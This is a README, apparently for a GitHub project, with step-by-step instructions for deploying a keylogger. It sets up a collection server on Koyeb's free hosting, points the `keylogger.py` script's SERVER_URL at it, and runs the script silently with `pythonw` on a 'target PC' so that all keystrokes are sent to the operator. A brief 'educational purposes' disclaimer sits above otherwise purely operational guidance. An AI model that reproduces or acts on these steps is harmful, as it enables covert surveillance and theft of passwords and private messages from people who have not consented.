# Using Koyeb free clould for Keylogging.

## This code does not support or encourage any illegal activities. It is intended solely for educational purposes and to raise awareness.

## This is a proof of concept and has significant potential for improvement.

**Instructions for Deploying and Running the Keylogger via GitHub Repository**

### Step 1: Fork the GitHub Repository and Set Up a Service

- Visit the GitHub repository: https://github.com/parikshitjangid/keylogger and fork it to your account.
- Go to [Koyeb](https://www.koyeb.com/) and create a free account.
- Use your forked GitHub repository to create a new service.

### Step 2: Configure the Buildpack

- During the service creation process, click on "Configure Buildpack."

### Step 3: Set the Build Command

- Enter the following build command:
  ```
  npm install
  ```

### Step 4: Set the Run Command

- Enter the following run command:
  ```
  node server.js
  ```

### Step 5: Expose Ports

- Select the "Exposed Ports" option.
- Change the "Port" value to **8080**.
- Click on **Deploy**.

### Step 6: Copy the Deployment URL

- Once the deployment is successful, copy the service URL displayed on Koyeb.
- The URL will end with **"koyeb.app/"**.

### Step 7: Open the Service URL

- Open the copied URL in your browser to verify the deployment.

### Step 8: Update the Keylogger Script

- Open the `keylogger.py` file in your forked repository.
- Replace `SERVER_URL` with your deployed Koyeb service URL:
  ```python
  SERVER_URL = "<Your server URL>"
  ```

### Step 9: Run the Keylogger on Another PC

- Ensure Python is installed on the target PC.
- Open the **Command Prompt** and navigate to the directory where `keylogger.py` is stored using the `cd` command.
- Run the following command:
  ```
  pythonw keylogger.py
  ```

### Step 10: Start Capturing Keystrokes

- Once executed, all keystrokes from the target PC will be sent to your deployed service and can be viewed in your browser.

**Note:** Ensure that Python is pre-installed on the target PC before executing the script.

